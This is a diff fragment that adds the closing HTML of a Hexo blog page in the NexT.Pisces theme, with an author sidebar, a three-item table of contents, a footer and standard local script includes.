+                  <span class="links-of-author-item">
+                    <a href="mailto:zhengbaole_1996@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#初衷"><span class="nav-number">1.</span> <span class="nav-text">初衷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结果"><span class="nav-number">2.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">3.</span> <span class="nav-text">过程</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">摆码王子</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
